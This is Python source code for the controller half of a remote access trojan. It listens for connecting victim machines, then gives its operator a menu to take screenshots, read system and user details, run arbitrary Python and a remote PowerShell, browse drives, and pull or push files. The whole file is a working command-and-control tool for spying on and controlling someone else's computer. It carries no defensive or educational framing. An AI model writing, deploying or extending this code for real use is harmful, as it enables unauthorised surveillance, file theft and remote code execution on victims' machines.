import socket, os, time

# Socket Properties
HOST = "0.0.0.0"
PORT = 10000

# Defines shorter/simpler (Send & Recv) Functions for use
send = lambda data: conn.send(data)
recv = lambda buffer: conn.recv(buffer)
buffer = 0x400
delay = 0.3

os.system("clear" if os.name == "posix" else "cls")

# Listen for Client
def main():
    global conn, ClientInfo

    try:
        objSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        objSocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    except (socket.error, Exception) as e:
        print(f"[1] Error: ({e})"); exit(1)

    try:
        print(f"Listening on Port: ({PORT})\n" + "-"*26)
        objSocket.bind((HOST, PORT)); objSocket.listen(socket.SOMAXCONN)
    except (socket.error, Exception) as e2:
        print(f"[2] Error: ({e2})"); exit(1)

    while (True):
        try:
            conn, address = objSocket.accept()
            ClientInfo = conn.recv(buffer).decode().split()

            print(f"Computer Connected: ({ClientInfo[0]}) ({ClientInfo[1]})\n")
            return

        except (socket.error, Exception) as e3:
            print(f"[3] Error: ({e3})"); exit(1)

# Receive Large Amounts of Data
def recvall(buffer):
    data = b""
    while (len(data) < buffer):
        data += recv(buffer)
    return data

def UsableCommands():
    print("_______________________________________")
    print("(Connection Commands)                  |\n" + \
          "                                       |")
    print("[-tc] Terminate Connection             |")
    print("[-ac] Append Connection to Background  |")
    print("_______________________________________|")
    print("(User Interface Commands)              |\n" + \
          "                                       |")
    print("[-sm] Send Message (VBS-Box)           |")
    print("[-ss] Capture Screenshot               |")
    print("_______________________________________|")
    print("(System Commands)                      |\n" + \
          "                                       |")
    print("[-si] View System Information          |")
    print("[-pi] Remote Python Interpreter        |")
    print("[-rs] Remote Powershell                |")
    print("_______________________________________|")
    print("(File Commands)                        |\n" + \
          "                                       |")
    print("[-cd] Get Current Directory            |")
    print("[-vf] View Files                       |")
    print("[-sf] Send File                        |")
    print("[-rf] Receive File                     |")
    print("_______________________________________|\n")

def SendMessage():
    message = input("\nType Message: ")
    if (len(message) > buffer):
        print("[-] 1024 Characters Maximum\n")
    else:
        send(b"message-box"); time.sleep(delay); send(bytes(message, "utf-8"))
        print(recv(buffer).decode() + "\n")

def Screenshot(CurrentTime):
    send(b"capture-screenshot")

    ScreenshotStatus = recv(buffer).decode()
    if not (ScreenshotStatus == "success"):
        print(f"\nUnable to Capture Screen\nError Message: ({ScreenshotStatus})\n")
        return

    bytesize = int(recv(buffer).decode())
    with open(f"screenshot{CurrentTime}.png", "wb") as ImageFile:
        ImageFile.write(recvall(bytesize))

    print("\n[+] Screenshot Captured\n" + f"Total Size Received: ({str(bytesize)} Bytes)\n")

def SystemInformation():
    print(f"\nComputer: ({ClientInfo[1]})")
    print(f"Username: ({ClientInfo[2]})")
    print(f"IP Address: ({ClientInfo[0]})")
    print(f"System: ({ClientInfo[3]} {ClientInfo[4]})")
    print(f"Public IP: ({ClientInfo[5]})\n")

def PythonInterpreter():
    with open("code.txt", "w") as Code:
        Code.close()

    if (os.name == "posix"):
        os.system("nano " + "code.txt")
    else:
        os.system("start " + "code.txt")

    UserOption = input("\nExecute Code on Remote Machine? (y/n): ").lower()
    if not (UserOption == "y"):
        print("(Not Executing)\n"); os.remove("code.txt")
        return

    send(b"python-interpreter"); time.sleep(1)
    with open("code.txt", "rb") as CodeFile:
        send(CodeFile.read())

    ClientResponse = recv(buffer).decode()
    if not (ClientResponse == "SUCCESS"):
        print(ClientResponse + "\n"); os.remove("code.txt")
        return

    ClientOutput = recv(buffer).decode(); SplitOutput = ClientOutput.split("<")
    if (SplitOutput[0] == "no-output"):
        print("\n[Remote Machine Output]\n" + "-"*23 + "\n<No Output>\n")
    else:
        print("\n[Remote Machine Output]\n" + "-"*23 + f"\n{SplitOutput[0]}")

    os.remove("code.txt")

def RemotePowershell():
    send(b"remote-powershell")

    CurrentRemoteDirectory = recv(buffer).decode()
    while (True):
        PS_Command = input(f"\n(REMOTE) {CurrentRemoteDirectory}> ").lower()
        if (PS_Command == "exit"):
            print("(Exited Cmd)\n"); send(b"exit"); break

        elif (PS_Command == "cls" or PS_Command == "clear"):
            os.system("clear" if os.name == "posix" else "cls")

        elif (PS_Command == "powershell" or PS_Command == "cmd" or PS_Command == "start"):
            print("Currently in Poweshell")

        elif (PS_Command == "cd"):
            print("Cannot change Directory")

        elif (PS_Command == "cat"):
            print("File not Specified")

        elif (PS_Command == "copy" or PS_Command == "type" or PS_Command == "?"):
            print("This Command is Disabled")

        elif (len(PS_Command) > 0):
            send(PS_Command.encode())

            bytesize = int(recv(buffer).decode())
            data = recvall(bytesize)

            print(str(data, "utf-8"), end="")
        else:
            print(CurrentRemoteDirectory, end="")

def ViewFiles():
    send(b"view-files")

    print(f"Available Drives: ({recv(buffer).decode()})\n")
    RemoteDirectory = input("Remote Directory: "); send(RemoteDirectory.encode()); ClientResponse = recv(buffer).decode()
    if not (ClientResponse == "VALID"):
        print("(Remote Directory Not Found)\n")
        return

    Number_Of_Files = recv(buffer).decode()
    bytesize = int(recv(buffer).decode())
    files = recvall(bytesize).decode()

    if (bytesize > 0x4b0):
        print(f"\nFiles: [{Number_Of_Files}]\nCharacter Count: [{bytesize}]\n\nView Remote Files: [rfiles.txt]\n")
        with open("rfiles.txt", "w") as RemoteFiles:
            RemoteFiles.write(files)
    else:
        print(f"\nFiles: [{Number_Of_Files}]\nCharacter Count: [{bytesize}]\n\n{files}\n")

def SendFile():
    FilePath = input("\nEnter File Path: ")
    if not (os.path.isfile(FilePath)):
        print("(File Not Found)\n"); return

    send(b"send-file"); time.sleep(delay); send(os.path.basename(FilePath).encode()); time.sleep(delay); send(str(os.path.getsize(FilePath)).encode())
    with open(FilePath, "rb") as file:
        send(file.read())

    print(f"\nFile Name: [{os.path.basename(FilePath)}]\nTotal Size Sent: [{str(os.path.getsize(FilePath))} Bytes]\n")

def ReceiveFile():
    send(b"receive-file");

    RemotePath = input("\nRemote File Path: "); send(bytes(RemotePath, "utf-8")); ClientResponse = recv(buffer).decode()
    if not (ClientResponse == "success"):
        print("(Remote File Not Found)\n")
        return

    filename = recv(buffer).decode(); bytesize = int(recv(buffer).decode())
    with open(filename, "wb") as file:
        file.write(recvall(bytesize))

    print(f"\nFile Name: [{filename}]\nTotal Size Received: [{bytesize} Bytes]\n")

def RemoteCommands():
    while (True):
        try:
            command = input(f"({ClientInfo[0]})> ").lower().strip()
            if (command == "help" or command == "?"):
                UsableCommands()

            elif (command == "clear" or command == "cls"):
                os.system("clear" if os.name == "posix" else "cls")

            elif (command == "-tc"):
                send(b"close-connection"); print(f"(Terminated Connection)\n"); conn.close(); break

            elif (command == "-ac"):
                send(b"append-connection"); print(f"(Appended Connection)\n"); conn.close(); break

            elif (command == "-sm"):
                SendMessage()

            elif (command == "-ss"):
                Screenshot("-".join(time.strftime("%H:%M:%S", time.localtime()).split(":")))

            elif (command == "-si"):
                SystemInformation()

            elif (command == "-pi"):
                PythonInterpreter()

            elif (command == "-rs"):
                RemotePowershell()

            elif (command == "-cd"):
                send(b"current-dir"); print(recv(buffer).decode() + "\n")

            elif (command == "-vf"):
                ViewFiles()

            elif (command == "-sf"):
                SendFile()

            elif (command == "-rf"):
                ReceiveFile()
            else:
                print(f"Unrecognized Command: ({command})\n")

        except KeyboardInterrupt:
            send(b"append-connection"); print("\n(Keyboard Interrupted, Connection Appended)\n"); exit(0)

        except (socket.error, Exception) as e:
            print(f"\n[-] Lost Connection to ({ClientInfo[0]})\n" + f"Error Message: {e}\n"); exit(1)

main(); RemoteCommands()
